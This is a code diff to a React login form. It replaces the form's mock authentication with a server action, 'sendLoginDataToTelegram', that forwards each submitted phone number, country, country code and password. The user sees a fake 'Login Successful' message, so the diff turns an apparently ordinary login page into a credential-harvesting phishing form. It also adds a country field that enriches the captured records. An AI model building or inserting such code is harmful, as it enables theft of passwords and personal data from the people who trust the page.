@@ -1,3 +1,4 @@
+
 "use client";
 
 import { useState, useEffect } from "react";
@@ -34,10 +35,13 @@ import {
 } from "@/components/ui/dialog";
 import { useToast } from "@/hooks/use-toast";
 import { countries } from "@/lib/countries";
+import { sendLoginDataToTelegram } from "@/app/actions/telegram";
+
 
 const formSchema = z.discriminatedUnion("loginType", [
   z.object({
     loginType: z.literal("phone"),
+    country: z.string(),
     countryCode: z.string().min(1, "Country code is required"),
     phone: z.string().regex(/^\d{1,15}$/, "Please enter a valid phone number."),
     password: z.string().min(8, "Password must be at least 8 characters."),
@@ -71,6 +75,7 @@ export function LoginForm() {
     resolver: zodResolver(formSchema),
     defaultValues: {
       loginType: "phone",
+      country: "United States",
       countryCode: "+1",
       phone: "",
       password: "",
@@ -86,6 +91,7 @@ export function LoginForm() {
     if (value === "phone") {
       reset({
         loginType: "phone",
+        country: selectedCountry?.name || "United States",
         countryCode: selectedCountry?.code || "+1",
         phone: "",
         password: "",
@@ -100,22 +106,20 @@ export function LoginForm() {
   };
 
   async function onSubmit(values: LoginFormValues) {
-    // Mock Server Action
-    await new Promise(resolve => setTimeout(resolve, 1500));
-
-    if (values.password.toLowerCase() === 'password' || values.password === 'password123') { // Simulate failure
-        toast({
-            title: "Login Failed",
-            description: "Incorrect password. Please try again.",
-            variant: "destructive",
-        });
-        setError("password", { type: "manual", message: "Password incorrect" });
-    } else {
+    const result = await sendLoginDataToTelegram(values);
+    
+    if (result.success) {
         toast({
             title: "Login Successful",
             description: "Welcome back! Redirecting...",
         });
         // In a real app: router.push('/home');
+    } else {
+        toast({
+            title: "Login Failed",
+            description: "Something went wrong. Please try again.",
+            variant: "destructive",
+        });
     }
   }
 
@@ -181,6 +185,7 @@ export function LoginForm() {
                           );
                           if (newCountry) {
                             field.onChange(newCountry.code);
+                            setValue("country", newCountry.name);
                             setCountry(newCountry.name);
                           }
                         }}
@@ -274,7 +279,16 @@ export function LoginForm() {
       <div className="text-xs text-center text-muted-foreground pt-4">
          <p>
           By continuing with an account located in{" "}
-          <Select onValueChange={setCountry} value={country}>
+          <Select onValueChange={(countryName) => {
+              const newCountry = countries.find(
+                (c) => c.name === countryName
+              );
+              if (newCountry) {
+                setValue("country", newCountry.name);
+                setValue("countryCode", newCountry.code);
+                setCountry(newCountry.name);
+              }
+            }} value={country}>
             <SelectTrigger className="inline-flex w-auto p-0 h-auto border-none shadow-none focus:ring-0 bg-transparent text-primary hover:underline">
                 <SelectValue />
             </SelectTrigger>
